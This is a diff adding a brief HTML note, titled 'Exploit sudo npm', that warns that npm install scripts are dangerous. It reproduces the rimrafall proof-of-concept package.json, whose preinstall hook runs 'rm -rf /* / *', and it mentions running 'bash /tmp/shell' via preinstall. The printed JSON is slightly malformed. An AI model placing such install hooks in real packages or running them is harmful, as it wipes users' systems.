@@ -1,0 +1,30 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>NPM</title>
+</head><body>Exploit sudo npm<br/>
+npm install capability is dangerous. Example at joaojeronimo/rimrafall<br/>
+Sometimes requires sudo npm -i &lt;package&gt; --unsafe<br/>
+<br/>
+index.js: <br/>
+module.exports = "npm install could be dangerous.";<br/>
+<br/>
+package.json:<br/>
+{<br/>
+&nbsp; "name": "rimrafall",<br/>
+&nbsp; "version": "1.0.0",<br/>
+&nbsp; "description": "rm -rf /* #DO NOT INSTALL THIS",<br/>
+&nbsp; "main": "index.js",<br/>
+&nbsp; "scripts": {<br/>
+&nbsp; &nbsp; "preinstall": <b>"rm -rf /* / *</b>"<br/>
+&nbsp; },<br/>
+&nbsp; "keywords": [<br/>
+&nbsp; &nbsp; "rimraf",<br/>
+&nbsp; &nbsp; "rmrf",<br/>
+&nbsp; ]<br/>
+&nbsp; "author": "Joao Jeronimo",<br/>
+&nbsp; "license": "ISC"<br/>
+}<br/>
+<br/>
+The preinstall key allows arbitrary shell commands: ie bash /tmp/shell</body></html>
